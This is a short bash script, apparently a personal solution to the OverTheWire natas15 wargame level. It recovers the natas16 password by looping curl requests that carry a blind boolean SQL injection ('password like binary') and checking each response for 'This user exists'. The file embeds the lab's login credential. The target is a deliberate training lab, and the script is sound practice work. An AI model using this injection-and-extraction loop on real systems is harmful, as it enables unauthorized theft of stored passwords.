#!/bin/bash

#Author: Abdalla El Ghannam
#Date: Feb 17 2020
#Purpose: Get password for natas16

#note: This is generally a bash practice for me. The logic is almost identical to the code found https://www.jonyschats.nl/writeups/overthewire/natas/natas15/

#alphanum.sh brute forces the password for natas16 through multiple curl requests.
#A while loop that stops when password length is 32.
#A for loop that tries sequential combinations of passwords through modifying the sql query in the curl request.
#Multiple debugging statements included. So we can see what is happening.

p=""
len=${#p}
while [ $len -lt 32 ]
do

	for x in {a..z} {A..Z} {0..9}
	do
		url="http://natas15.natas.labs.overthewire.org/index.php?debug&username=natas16%22%20and%20password%20like%20binary%20%22$p$x%"
		result=$(curl "http://natas15.natas.labs.overthewire.org/index.php?debug&username=natas16%22%20and%20password%20like%20binary%20%22$p$x%" -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J | grep -o "This user exists")
		echo "Trying $p$x"
		echo "Trying $url"
		if [[ $result == "This user exists" ]]
		then
		p+=$x
		len=${#p}
		echo "this url matched: $url"
		break
		fi
		
	done


done

echo $p

#result=$(curl 'http://natas15.natas.labs.overthewire.org/index.php?debug&username=natas16%22%20and%20password%20like%20%27%w%%27%22' -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J | grep -o "This user exists")

#if [[ $result == "This user exists" ]]
#then
#	echo "add password"
#fi

